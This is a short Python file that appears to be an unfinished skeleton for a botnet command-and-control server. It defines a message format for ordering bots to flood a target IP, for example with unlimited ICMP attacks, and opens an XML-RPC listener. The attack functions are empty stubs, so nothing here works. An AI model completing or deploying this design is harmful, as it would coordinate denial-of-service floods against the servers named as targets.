"""
message_format = {
    "type": "attack", # "attack" or "stop"
    "target_ip": "0.0.0.0",
    "attack_type": "icmp",
    "number_of_attack": -1 # -1 for unlimited attack
}
"""

import socket
import xmlrpc.client
from xmlrpc.server import SimpleXMLRPCServer

def receiveConnectionFromBotnet():
    server = SimpleXMLRPCServer((getMasterIpAddress(), 8000))

def distributeCommand(message):
    """distributing command that has been build to botnet"""
    pass

def buildAttack(target_ip, attack_type, number_of_attack):
    """prepare the message attack that will send to botnet"""
    pass

def stopAttack():
    """stop attack to the target server"""
    pass

def viewBotnet():
    """view all list of available botnet"""
    pass

def getMasterIpAddress():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
    except:
        return "127.0.0.1"
    ip = s.getsockname()[0]
    s.close()
    return ip

def main():
    receiveConnectionFromBotnet()
    print(getMasterIpAddress())

if __name__ == '__main__':
    main()